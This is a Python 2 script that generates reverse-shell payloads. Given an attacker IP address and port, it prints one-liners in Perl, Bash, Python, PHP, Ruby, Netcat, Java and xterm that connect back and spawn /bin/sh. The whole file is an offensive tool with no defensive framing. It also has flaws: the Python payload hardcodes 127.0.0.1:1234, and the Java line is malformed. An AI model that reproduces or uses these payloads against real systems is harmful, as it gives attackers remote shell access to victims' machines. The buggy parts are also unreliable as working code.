#!/usr/bin/env python 
# -*- coding:utf-8 -*- 

#pip install colorama

__author__ = "ihebski, @KeyStrOke95 Thanks for Trolls"
__status__ = "Development 2k19"

import sys
from colorama import Fore, Back, Style


def start(argv):
    if len(sys.argv) < 3:
    	print '''Dude, IP & Port ???     ¯\_(ツ)_/¯ '''
        sys.exit()
    else:
        main(argv[0],argv[1])


def main(ip,port):
	print(Fore.BLUE + '\n [+] Perl Payload \n')
	print Fore.WHITE+""" perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """ % (ip,port)
	print(Fore.BLUE + '\n [+] Bash Payload \n')
	print Fore.WHITE+""" bash -i >& /dev/tcp/{0}/{1} 0>&1 """.format(ip,port)
	print(Fore.BLUE + '\n [+] Python Payload \n')
	print Fore.WHITE+""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """.format("127.0.0.1","1234")
	print(Fore.BLUE + '\n [+] PHP Payload \n')
	print Fore.WHITE+""" php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");' """.format(ip,port)
	print(Fore.BLUE + '\n [+] Ruby Payload \n')
	print Fore.WHITE+""" ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' """.format(ip,port)
	
	print(Fore.BLUE + '\n [+] Netcat Payload\n')
	print Fore.RED +"Payload 01 => "+Fore.WHITE+""" nc -e /bin/sh {0} {1} """.format(ip,port)
	print Fore.RED +"Payload 02 => "+Fore.WHITE+""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f """.format(ip,port)

	print(Fore.BLUE + '\n [+] Java Payload\n')

	print Fore.WHITE+""" r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor() """.format(ip,port)
	
	print(Fore.BLUE + '\n [+] xTerm Payload\n')
	print Fore.WHITE+""" xterm -display {0}:1 """.format(ip)
	print "\n"

if __name__ == '__main__':
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt as err:
		print "\n[!] :)"
		sys.exit(0)
